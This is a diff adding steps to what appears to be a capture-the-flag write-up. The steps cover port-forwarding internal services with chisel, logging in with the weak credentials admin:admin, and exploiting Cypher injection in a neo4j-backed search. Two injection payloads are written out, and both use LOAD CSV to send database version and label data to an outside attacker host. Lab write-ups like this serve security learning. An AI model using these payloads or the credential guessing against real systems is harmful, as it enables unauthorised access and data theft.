@@ -76,7 +76,7 @@ Here's how I stabilized my shell
 python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
 
-Checking the internal ports avaiable shows that a service is running on port 3000
+Checking the internal ports avaiable shows that a service is running on port 3000 and 8001
 ![image](https://user-images.githubusercontent.com/127159644/236716251-7e6f788d-86ce-4c4b-93a9-bad02d10b5a0.png)
 
 Lets port forward using chisel shall we 🙂
@@ -93,5 +93,48 @@ We can confirm that it was successfully port forwarded by scanning our host
 ![image](https://user-images.githubusercontent.com/127159644/236716902-a733ac13-25e0-4a9f-9c1e-e3b7e3f67f08.png)
 
 Now lets see what it contains or rather what it is 😅
+![image](https://user-images.githubusercontent.com/127159644/236717017-4ae503d5-2697-4403-8c33-8eee48cc1f4d.png)
+
+Hmmmm that's an instance of Gogs
+
+I checked /explore to see if i can get any repo but i didn't tho i got two users which were *John and Administrator*
+![image](https://user-images.githubusercontent.com/127159644/236717468-98e81d97-39c4-4766-9876-cfe9f608b44c.png)
+
+Nothing much we can do now
+
+Lets port forward the service on port 8001 and see what we can fetch 
+
+After I did that (the same i port forwarded earlier) looking at the page shows this
+![image](https://user-images.githubusercontent.com/127159644/236717677-1742d53a-3490-4f89-ad45-e317176d5214.png)
+
+Trying weak cred *admin:admin* works
+![image](https://user-images.githubusercontent.com/127159644/236717758-e9528367-0261-48b4-bfe9-62c79d54b704.png)
+
+Poking around I saw the notes left by the admin
+![image](https://user-images.githubusercontent.com/127159644/236717899-c48aa7c2-60f8-45d9-9d1e-2ac70d875c8d.png)
+
+The db is based of neo4j interesting 🤔
+
+There's a search function of the web app
+![image](https://user-images.githubusercontent.com/127159644/236717977-991faca1-807d-4ac0-9506-617505ffc1fb.png)
+
+Looking for how to exploit neo4j database leads to Cypher Injection here's the [source](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)
+
+We can test with this query through Burpsuite to know the version, then url encode and send it a web server hosted by us.
+
+```sql
+' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.175/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
+```
+
+Trying the query leaks the version
+![image](https://user-images.githubusercontent.com/127159644/236718595-8bf9d822-d889-4245-b196-6c50ed12e07b.png)
+![image](https://user-images.githubusercontent.com/127159644/236718623-4da759bb-625a-4114-8357-512c73ff0cef.png)
+
+Now lets get the list of tables
+
+```sql
+'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.175/?label='+label as l RETURN 0 as _0 //
+```
+
 
 
